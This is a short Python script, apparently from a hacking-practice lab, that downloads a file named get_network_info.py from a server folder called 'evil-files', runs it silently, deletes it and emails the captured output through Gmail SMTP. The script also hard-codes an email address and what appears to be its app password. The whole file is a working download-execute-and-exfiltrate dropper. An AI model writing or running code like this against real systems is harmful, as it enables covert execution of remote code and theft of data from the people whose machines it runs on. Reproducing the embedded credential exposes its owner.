#!/usr/bin/env python3

import requests
import subprocess, smtplib, ssl, os, tempfile
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart



def download(url):
    get_response = requests.get(url)
    content = get_response.content

    file = url.split('/')[-1]

    with open(file, 'wb') as output_file:
        output_file.write(content) 
        
def send_mail(password, message, email_from = "akyeba@gmail.com", email_to = "akyeba@gmail.com"):
    context = ssl.create_default_context()
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls(context=context)
        server.login(email_from, password)
        server.sendmail(email_from, email_to, message)
    except Exception as e:
        print(e)
    finally:
        server.quit()

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download("http://10.0.2.15/evil-files/get_network_info.py")
command = "python3 get_network_info.py"
result = subprocess.check_output(command.split(' '))
os.remove("get_network_info.py")
result = result.decode()
print(result)

email_from = "akyeba@gmail.com"
email_to = "akyeba@gmail.com"

message = MIMEMultipart("mixed")
message["Subject"] = "Attack Testing"
message["From"] = email_from
message["To"] = email_to

payload = MIMEText(result, "plain")
message.attach(payload)
send_mail("btzxndupcrpuvsfg", message.as_string())
